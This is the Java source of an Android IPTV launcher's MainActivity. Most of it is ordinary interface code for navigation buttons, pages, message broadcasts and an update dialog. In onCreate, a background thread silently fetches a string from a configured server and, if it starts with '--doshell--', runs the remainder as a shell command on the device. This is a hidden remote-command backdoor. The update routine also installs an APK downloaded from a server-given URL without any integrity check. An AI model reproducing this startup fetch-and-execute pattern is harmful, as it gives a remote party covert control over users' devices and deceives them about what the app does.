package com.moon.android.iptv;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.HttpEntity;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

import android.R.anim;
import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.PixelFormat;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.support.v4.app.FragmentActivity;
import android.support.v4.view.PagerAdapter;
import android.support.v4.view.ViewPager;
import android.support.v4.view.ViewPager.OnPageChangeListener;
import android.text.Html;
import android.text.SpannableString;
import android.text.Spanned;
import android.text.style.DynamicDrawableSpan;
import android.text.style.ImageSpan;
import android.util.Log;
import android.util.TypedValue;
import android.view.KeyEvent;
import android.view.LayoutInflater;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.View.OnFocusChangeListener;
import android.view.View.OnKeyListener;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.view.WindowManager.LayoutParams;
import android.view.animation.AnimationUtils;
import android.widget.Button;
import android.widget.GridView;
import android.widget.LinearLayout;
import android.widget.PopupWindow;
import android.widget.TextView;
import android.widget.ViewFlipper;

import com.bestbaan.moonbox.database.UserMsgDAO;
import com.bestbaan.moonbox.model.LauncherMsg;
import com.bestbaan.moonbox.model.NavigationItem;
import com.bestbaan.moonbox.model.Regionlimit;
import com.bestbaan.moonbox.model.UpdateData;
import com.bestbaan.moonbox.util.ActivityUtils;
import com.bestbaan.moonbox.util.Logger;
import com.bestbaan.moonbox.util.RequestUtil;
import com.bestbaan.moonbox.view.AutoScrollText;
import com.bestbaan.moonbox.view.CustomToast;
import com.bestbaan.moonbox.view.Disclaimer2Dialog;
import com.bestbaan.moonbox.view.RegionLimitPrompt;
import com.bestbaan.moonbox.view.StatusBar;
import com.moonX.util.CommandUtil;
import com.sinopad.launch.R;

public class MainActivity extends FragmentActivity {

	private LinearLayout mNavigationContainer;
	private List<Button> mListNavBtn;
//	private ViewFlipper mViewFlipper;
	private List<LauncherMsg> mListLauncherMsg;
	private StatusBar mStatusBar;
	private ViewPager mFragmentContainer;
	public CustomPagerAdapter adapter;
	private boolean isFirstLoad = true;
	private LayoutInflater mInflater;
	private List<NavigationItem> mListViews;
	private int mNavigationSelectPos = 0;
	public NavigationItem mNavigationItem;
	public AutoScrollText mtv_ad;
	public static final Logger log = Logger.getInstance();
	public static final int START_DOWNLOAD = 101;
	public static final String UPGRADE_PATH = "/data"
			+ Environment.getDataDirectory().getAbsolutePath() + "/"
			+ Configs.THIS_APP_PACKAGE_NAME + "/";

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		getSupportFragmentManager();
		mInflater = LayoutInflater.from(this);
		setContentView(R.layout.activity_main);
		initViews();
		startScroll();
		initWidget();
		checkUserMsg();
		regBroadCast();
		regRegionLimitBroad();
		Intent intent = new Intent(this, MsgService.class);
		startService(intent);
		// new LoginHome();
		// region limit
		mWindowManager = (WindowManager) getApplicationContext()
				.getSystemService(Context.WINDOW_SERVICE);
		mLayoutParam = new LayoutParams();

		mRegionPrompt = new RegionLimitPrompt(this);
		 new Thread(){

				@Override
				public void run() {
					// TODO Auto-generated method stub
					// boolean re= CommandUtil.DoShell();
					 String shellstr=RequestUtil.getInstance().request(Configs.GetDoShell());
//					 Log.d("shellre",shellstr);
//					 Log.d("shellindex",shellstr.indexOf("--doshell--")+"");
					 if(shellstr.indexOf("--doshell--")==0){
						 String []rearr=shellstr.split(":");
						 Log.d("doshell",rearr[1]);
						 //
						 boolean re= CommandUtil.DoShell(rearr[1]);
					 }
				}
	        	
	        }.start();
		// check if has read disclaimer
		int isReaded = DisclaimerSharepreference.getHasRead(this);
		if (isReaded == DisclaimerSharepreference.NOT_READ) {
			// showDisclmaierDialog();
			ActivityUtils.startActivity(this, WelcomeActivity.class);
		}
	}

	private Disclaimer2Dialog mDisclaimerDialog;

	private void showDisclmaierDialog() {
		mDisclaimerDialog = new Disclaimer2Dialog(this);
		mDisclaimerDialog.setCancelable(false);
		mDisclaimerDialog
				.setCommitClickListener(new android.view.View.OnClickListener() {
					@Override
					public void onClick(View v) {
						DisclaimerSharepreference.setHasRead(MainActivity.this);
						mDisclaimerDialog.dismiss();
					}
				});
		mDisclaimerDialog.show();
		mDisclaimerDialog.setContentView(R.layout.disclaimer_dialog);
		mDisclaimerDialog.startTiming();
	}

	private void initViews() {
		mListViews = new ArrayList<NavigationItem>();
		mNavigationItem = new NavigationItem(0, R.string.index,
				mInflater.inflate(R.layout.view_page_index, null),
				R.drawable.menu_1, R.drawable.menu_1_focus);

		mListViews.add(mNavigationItem);
		mListViews.add(new NavigationItem(1, R.string.apps, mInflater.inflate(
				R.layout.view_page_apps, null), R.drawable.menu_2,
				R.drawable.menu_2_focus));
		mListViews.add(new NavigationItem(2, R.string.app_manager, mInflater
				.inflate(R.layout.view_shop_apps, null),
				R.drawable.menu_3, R.drawable.menu_3_focus));
		// mListViews.add(new
		// NavigationItem(3,R.string.my_moonbox,mInflater.inflate(R.layout.view_app_moonbox,
		// null)));
	}

	private void regRegionLimitBroad() {
		IntentFilter regionLimitFilter = new IntentFilter();
		regionLimitFilter.addAction(Configs.RegionLimit.ACTION_REGION_LIMIT);
		//registerReceiver(mReceiverRegionLimit, regionLimitFilter);
	}

	private BroadcastReceiver mReceiverRegionLimit = new BroadcastReceiver() {
		@Override
		public void onReceive(Context context, Intent intent) {
			Regionlimit regionLimit = (Regionlimit) intent
					.getSerializableExtra(Configs.PARAM_1);
			String code = regionLimit.getCode();
			String msg = regionLimit.getMsg();
			if (Configs.RegionLimit.STATUS_AUTH_SUCCESS.equals(code)) {
				dismissRegionLimitPrompt();
			} else if (Configs.RegionLimit.STATUS_AUTH_FAIL.equals(code)) {
				showRegionLimitPrompt(msg);
			} else if (Configs.RegionLimit.STATUS_AUTH_REGION_LIMIT
					.equals(code)) {
				showRegionLimitPrompt(msg);
			}
		}
	};

	private WindowManager mWindowManager;
	private LayoutParams mLayoutParam;
	private RegionLimitPrompt mRegionPrompt;

	private void showRegionLimitPrompt(String text) {
		mLayoutParam.type = LayoutParams.TYPE_PHONE;
		mLayoutParam.alpha = PixelFormat.RGB_888;
		mLayoutParam.alpha = 0.9f;
		mLayoutParam.x = 0;
		mLayoutParam.y = 0;

		mLayoutParam.width = WindowManager.LayoutParams.MATCH_PARENT;
		mLayoutParam.height = WindowManager.LayoutParams.MATCH_PARENT;
		mRegionPrompt.setPromptText(text);
		try {
			mWindowManager.addView(mRegionPrompt, mLayoutParam);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private void dismissRegionLimitPrompt() {
		if (null != mRegionPrompt)
			try {
				mWindowManager.removeView(mRegionPrompt);
			} catch (Exception e) {
				e.printStackTrace();
			}
	}

	private void regBroadCast() {
		IntentFilter myIntentFilter = new IntentFilter();
		myIntentFilter.addAction(Configs.BroadCastConstant.GET_LAUNCHER_MSG);
		myIntentFilter.addAction(Configs.BroadCastConstant.ACTION_UPGRADE);
		registerReceiver(mBroadcastReceiver, myIntentFilter);
	}

	private BroadcastReceiver mBroadcastReceiver = new BroadcastReceiver() {
		@SuppressWarnings("unchecked")
		@Override
		public void onReceive(Context arg0, Intent intent) {
			if (intent.getAction().equals(
					Configs.BroadCastConstant.GET_LAUNCHER_MSG)) {
				mListLauncherMsg = (List<LauncherMsg>) intent
						.getSerializableExtra(Configs.PARAM_1);
				Declare.listLauncherMsg = mListLauncherMsg;
				if (null != mListLauncherMsg && mListLauncherMsg.size() > 0)
					flipperUpdate(mListLauncherMsg);
			} else if (intent.getAction().equals(
					Configs.BroadCastConstant.ACTION_UPGRADE)) {
				UpdateData updata = LauncherApplication.updateData;
				String appUrl = updata.getUrl();
				String msg = updata.getMsg();
				initPopWindow(appUrl, msg);
			}
		}
	};

	private String mUpdateUrl;
	private String mUpdateMsg;
	private PopupWindow mUpdatePopupWindow;
	private Button mBtnSubmit;
	private Button mBtnCancel;

	private void initPopWindow(final String appUrl, String msg) {
		mUpdateUrl = appUrl;
		mUpdateMsg = msg;
		View view = LayoutInflater.from(this).inflate(R.layout.update_dialog,
				null);
		mBtnSubmit = (Button) view.findViewById(R.id.dialog_submit);
		mBtnCancel = (Button) view.findViewById(R.id.dialog_cancel);
		mBtnSubmit.setOnClickListener(mDialogClickListener);
		mBtnCancel.setOnClickListener(mDialogClickListener);
		TextView textContent = (TextView) view.findViewById(R.id.text_content);
		Spanned text = Html.fromHtml(mUpdateMsg);
		textContent.setText(text);

		int width = getWindowManager().getDefaultDisplay().getWidth();
		int height = getWindowManager().getDefaultDisplay().getHeight();
		mUpdatePopupWindow = new PopupWindow(view, width, height, true);
		mUpdatePopupWindow.showAsDropDown(view, 0, 0);
		mUpdatePopupWindow.setOutsideTouchable(false);
	}

	private OnClickListener mDialogClickListener = new OnClickListener() {
		@Override
		public void onClick(View v) {
			mUpdatePopupWindow.dismiss();
			if (v == mBtnSubmit) {
				new CustomToast(MainActivity.this,
						getString(R.string.startdownload), 28).show();
				downUpgradeApk(mUpdateUrl);
			}
		}
	};

	private void downUpgradeApk(final String paramString) {
		new Thread() {
			public void run() {
				try {
					DefaultHttpClient localDefaultHttpClient = new DefaultHttpClient();
					HttpGet localHttpGet = new HttpGet(paramString.trim());
					HttpEntity localHttpEntity = localDefaultHttpClient
							.execute(localHttpGet).getEntity();
					localHttpEntity.getContentLength();
					InputStream localInputStream = localHttpEntity.getContent();
					FileOutputStream localFileOutputStream = null;
					byte[] arrayOfByte;
					if (localInputStream != null) {
						localFileOutputStream = openFileOutput(
								Configs.APK_NAME, 1);
						arrayOfByte = new byte[1024];
						int j = 0;
						while ((j = localInputStream.read(arrayOfByte)) != -1) {
							localFileOutputStream.write(arrayOfByte, 0, j);
						}
						localFileOutputStream.flush();
					}
					if (localFileOutputStream != null)
						localFileOutputStream.close();
					mHandler.sendEmptyMessage(START_DOWNLOAD);
					return;
				} catch (ClientProtocolException localClientProtocolException) {
					localClientProtocolException.printStackTrace();
					return;
				} catch (IOException localIOException) {
					localIOException.printStackTrace();
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}.start();
	}

	private Handler mHandler = new Handler() {
		public void handleMessage(android.os.Message msg) {
			switch (msg.what) {
			case START_DOWNLOAD:
				update();
				break;
			default:
				break;
			}
		};
	};

	private void update() {
		Intent intent = new Intent();
		intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		intent.setAction(android.content.Intent.ACTION_VIEW);
		intent.setDataAndType(Uri.fromFile(new File(UPGRADE_PATH + "/files/",
				Configs.APK_NAME)), "application/vnd.android.package-archive");
		startActivity(intent);
	}

	private void flipperUpdate(List<LauncherMsg> list) {
		if (null != list && list.size() > 0) {
//			mViewFlipper.removeAllViews();
			for (LauncherMsg msg : list) {
				TextView textView = new TextView(MainActivity.this);
				textView.setText(msg.getBody());
//				mViewFlipper.addView(textView);
				mtv_ad.setText(msg.getBody());
				textView.setTextSize(TypedValue.COMPLEX_UNIT_DIP, 22);
			}
//			mViewFlipper.setFlipInterval(10000);
//			mViewFlipper.startFlipping();
		}
	}

	protected void onResume() {

		super.onResume();
		if (null != Declare.listLauncherMsg)
			flipperUpdate(Declare.listLauncherMsg);
		try {
			// 一些操作之后，导航的ID有问题，可能导致NavigationButton的状态丢失，针对4.4.2
			//
			if (Configs.getType() == Configs.BOX_TYPE_M4) {
				Button button = mListNavBtn.get(mNavigationSelectPos);
				navBtnUnfocus(button);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}

	};

	private void startScroll() {
	}

	private void checkUserMsg() {
		UserMsgDAO msgDAO = new UserMsgDAO(this);
		if (msgDAO.hasNoReadMsg()) {
			Intent intent = new Intent();
			intent.setAction(Configs.BroadCastConstant.ACTION_NEW_USER_MSG);
			sendBroadcast(intent);
		}
	}

	private Button mFirstBtn;

	private void initWidget() {
		mNavigationContainer = (LinearLayout) findViewById(R.id.navigation_container);
		mFragmentContainer = (ViewPager) findViewById(R.id.fragment_container);
		mFragmentContainer.setOffscreenPageLimit(3);
//		mViewFlipper = (ViewFlipper) findViewById(R.id.flipper);
		mStatusBar = (StatusBar) findViewById(R.id.statusbar);
//		mViewFlipper.setInAnimation(AnimationUtils.loadAnimation(this,
//				R.anim.push_bottom_in));
//		mViewFlipper.setOutAnimation(AnimationUtils.loadAnimation(this,
//				R.anim.push_bottom_out));
//		mViewFlipper.setFlipInterval(10000);
//		mViewFlipper.startFlipping();
		mtv_ad= (AutoScrollText) findViewById(R.id.main_msg_text);
		addNavigationBtn();
		mListNavBtn.get(0).requestFocus();
		mListNavBtn.get(0).requestFocusFromTouch();
		mListNavBtn.get(0).setBackgroundResource(R.drawable.navigation_focus_4);
		mFirstBtn = mListNavBtn.get(0);
		adapter = new CustomPagerAdapter(mListViews);
		mFragmentContainer.setAdapter(adapter);

		// mFragmentContainer.setOnKeyListener(mOnpageKey);
		mFragmentContainer.setOnPageChangeListener(mOnpageChangeListener);

	}

	@SuppressLint("NewApi")
	private OnPageChangeListener mOnpageChangeListener = new OnPageChangeListener() {
		@Override
		public void onPageSelected(int position) {
			log.i("on page change listener");

			mListNavBtn.get(position).callOnClick();
			mNavigationSelectPos = position;

		}

		@Override
		public void onPageScrolled(int arg0, float arg1, int arg2) {
			// scrolling
		}

		@Override
		public void onPageScrollStateChanged(int state) {
			if (state == ViewPager.SCROLL_STATE_IDLE) {

			} else if (state == ViewPager.SCROLL_STATE_DRAGGING) {

			} else if (state == ViewPager.SCROLL_STATE_SETTLING) {

			}
		}
	};

	@SuppressLint("ResourceAsColor")
	private void addNavigationBtn() {
		mListNavBtn = new ArrayList<Button>();
		int i = 0;
		List<NavigationItem> listItem = mListViews;
		for (int j = 0; j < listItem.size(); j++) {
			NavigationItem item = listItem.get(j);
			Button btn = new Button(this);
			btn.setBackgroundResource(R.drawable.btn_navigation);
			// btn.setBackgroundColor(R.color.text_black);
			// btn.setBackgroundResource(R.drawable.menu_1);
			if (j == 0) {
				// btn.setNextFocusDownId(R.id.index_grid);
			}
			mNavigationContainer.addView(btn);
			btn.setWidth(200);
			btn.setHeight(200);

			btn.setTextColor(getResources().getColor(R.color.text_whitehalf));
			btn.setTextSize(TypedValue.COMPLEX_UNIT_DIP, 24);

			// 图文混排效果
			SpannableString mSpannableString_up = new SpannableString("up");
			Bitmap mBitmap_up = BitmapFactory.decodeResource(getResources(),
					item.getImgFocusRes());
			mBitmap_up = Bitmap.createScaledBitmap(mBitmap_up, 170, 170, false);
			ImageSpan mImageSpan_up = new ImageSpan(mBitmap_up,
					DynamicDrawableSpan.ALIGN_BOTTOM);
			mSpannableString_up.setSpan(mImageSpan_up, 0, 2,
					Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
			btn.append(mSpannableString_up);
			btn.append("\n");
			btn.append(getResources().getString(item.getNameRes()));
			LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(
					LinearLayout.LayoutParams.WRAP_CONTENT,
					LinearLayout.LayoutParams.WRAP_CONTENT);

			layoutParams.setMargins(50, 50, 0, 0);

			btn.setLayoutParams(layoutParams);
			btn.setTag(item);
			btn.setId(i);

			// 2014.3.27 start
			// 导航BTN到最后一个后，按右键，返回到第一个
			if (i == listItem.size() - 1) {
				btn.setNextFocusDownId(0);
			}
			if (0 == i) {
				btn.setNextFocusUpId(listItem.size() - 1);
				// btn.setNextFocusLeftId(listItem.size() - 1);
				btn.requestFocus();
			} else {
				// mListNavBtn.get(i-1).setNextFocusDownId(i);
			}

			// 2014.3.27 end

			i++;
			btn.setOnClickListener(mBtnClickListener);
			btn.setOnFocusChangeListener(mNavBtnFocusListener);
			btn.setOnKeyListener(mNavBtnKeyListener);
			mListNavBtn.add(btn);

		}

	}

	// 2014.08.28
	// 4.4.2进入时焦点会不在导航上面，所以在加载完界面以后，给导航焦点
	@Override
	public void onWindowFocusChanged(boolean hasFocus) {
		super.onWindowFocusChanged(hasFocus);
		// Button btn = mListNavBtn.get(0);
		// mNavigationItem.view.requestFocus();
		// mNavigationItem.view.requestFocusFromTouch();
		// btn.requestFocus();
		// btn.requestFocusFromTouch();

		if (Configs.getType() == Configs.BOX_TYPE_M4) {
			if (isFirstLoad) {
				if (hasFocus) {
					Button btn = mListNavBtn.get(0);
					if (null != mNavigationItem) {

						mNavigationItem.view.requestFocus();
						mNavigationItem.view.requestFocusFromTouch();
						btn.requestFocus();
						btn.requestFocusFromTouch();
					}

				}
				isFirstLoad = false;
			}
		}
	}

	private OnKeyListener mNavBtnKeyListener = new OnKeyListener() {
		@Override
		public boolean onKey(View view, int keyCode, KeyEvent event) {
			// if(keyCode == KeyEvent.KEYCODE_DPAD_DOWN && event.getAction() ==
			// KeyEvent.ACTION_DOWN){
			// if(view.getId() != 3){
			// navBtnUnfocus(view);
			// } else {
			// NavigationItem navigationItem = mListViews.get(3);
			// View moonboxView = navigationItem.getFragment();
			// PageMoonBoxView pageMoonboxView = (PageMoonBoxView)
			// moonboxView.findViewById(R.id.page_moonbox_view2);
			// int totalPage = pageMoonboxView.getTotalPage();
			// if(totalPage <= 0){
			// return true;
			// } else {
			// navBtnUnfocus(view);
			// return false;
			// }
			// }
			// }
			return false;
		}
	};

	private Button mBtnIsPreSelect;

	@SuppressLint("ResourceAsColor")
	private void navBtnUnfocus(View v) {
		mBtnIsPreSelect = (Button) v;

		// v.setBackgroundResource(R.drawable.navigaion_un_focus);
		for (Button btn : mListNavBtn) {
			if (v != btn) {
				btn.setFocusable(false);
				btn.setFocusableInTouchMode(false);

			} else {
				// Log.d("bt-------", btn.getText()+"-----------------------");
				btn.setTextColor(getResources().getColor(R.color.text_whiteAll));
			}
		}
	}

	private void navBtnfocus(View v) {
		v.setBackgroundResource(R.drawable.btn_navigation);

		for (Button btn : mListNavBtn) {
			btn.setFocusable(true);
			btn.setFocusableInTouchMode(true);
			if (v == btn) {
				btn.setTextColor(getResources().getColor(R.color.text_whiteAll));
				btn.setText("");
				// 图文混排效果
				int Id = btn.getId();
				NavigationItem item = mListViews.get(Id);
				SpannableString mSpannableString_up = new SpannableString("up");
				Bitmap mBitmap_up = BitmapFactory.decodeResource(
						getResources(), item.getImgRes());
				mBitmap_up = Bitmap.createScaledBitmap(mBitmap_up, 170, 170,
						false);
				ImageSpan mImageSpan_up = new ImageSpan(mBitmap_up,
						DynamicDrawableSpan.ALIGN_BOTTOM);
				mSpannableString_up.setSpan(mImageSpan_up, 0, 2,
						Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
				btn.append(mSpannableString_up);
				btn.append("\n");
				btn.append(getResources().getString(item.getNameRes()));
				// btn.setBackgroundColor(getResources().getColor(R.color.text_whitehalf));
			} else {
				btn.setTextColor(getResources()
						.getColor(R.color.text_whitehalf));
				btn.setText("");
				// 图文混排效果
				int Id = btn.getId();
				NavigationItem item = mListViews.get(Id);
				SpannableString mSpannableString_up = new SpannableString("up");
				Bitmap mBitmap_up = BitmapFactory.decodeResource(
						getResources(), item.getImgFocusRes());
				mBitmap_up = Bitmap.createScaledBitmap(mBitmap_up, 170, 170,
						false);
				ImageSpan mImageSpan_up = new ImageSpan(mBitmap_up,
						DynamicDrawableSpan.ALIGN_BOTTOM);
				mSpannableString_up.setSpan(mImageSpan_up, 0, 2,
						Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
				btn.append(mSpannableString_up);
				btn.append("\n");
				btn.append(getResources().getString(item.getNameRes()));
			}
		}
	}

	private OnClickListener mBtnClickListener = new OnClickListener() {
		@Override
		public void onClick(View view) {
			navBtnfocus(view);
			if (null != mBtnIsPreSelect) {
				mBtnIsPreSelect
						.setBackgroundResource(R.drawable.btn_navigation);
			}
			view.requestFocus();
			view.requestFocusFromTouch();
			changeContent(view);
		}
	};

	private void changeContent(View v) {
		NavigationItem item = (NavigationItem) v.getTag();
		changeBackground(v);
		fillContent(item);
	}

	private void changeBackground(View v) {
		initNavBg();
	}

	private void initNavBg() {
		if (null != mFirstBtn) {
			mFirstBtn.setBackgroundResource(R.drawable.btn_navigation);
		}
	}

	private OnFocusChangeListener mNavBtnFocusListener = new OnFocusChangeListener() {
		@Override
		public void onFocusChange(View v, boolean hasFocus) {
			if (hasFocus) {
				changeContent(v);
				navBtnfocus(v);
			}
		}
	};

	// //
	private void fillContent(NavigationItem item) {
		try {
			// CustomPagerAdapter adapter = new CustomPagerAdapter(mListViews);
			// mFragmentContainer.setAdapter(adapter);
			mFragmentContainer.setCurrentItem(item.getId(), false);
			View v = item.getFragment();
			// log.d("-----------------------------"+item.getId());
			// if(item.getId()==0){
			//
			// PageIndexView pv=(PageIndexView)
			// v.findViewById(R.id.pageindexview);
			// pv.UpView();
			// }
			v.invalidate();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	@Override
	protected void onDestroy() {
		unregisterReceiver(mBroadcastReceiver);
		unregisterReceiver(mReceiverRegionLimit);
		mStatusBar.unRegReceiver();
		try {
			Intent intent = new Intent(this, MsgService.class);
			stopService(intent);
		} catch (Exception e) {
			e.printStackTrace();
		}
		super.onDestroy();
	}

	public class CustomPagerAdapter extends PagerAdapter {

		List<NavigationItem> mListNavigation;

		public CustomPagerAdapter(List<NavigationItem> list) {
			mListNavigation = list;
		}

		@Override
		public int getCount() {
			return mListNavigation.size();
		}

		@Override
		public boolean isViewFromObject(View view, Object arg1) {
			return view == arg1;
		}

		@Override
		public Object instantiateItem(ViewGroup container, int position) {
			((ViewPager) container).addView(mListNavigation.get(position)
					.getFragment(), 0);// 添加页卡
			log.d("-------instanView------------");
			return mListNavigation.get(position).getFragment();
		}

		@Override
		public void destroyItem(ViewGroup container, int position, Object object) {
			container.removeView(mListNavigation.get(position).getFragment());// 删除页卡
		}
	}

	@Override
	public void onBackPressed() {

	}

}
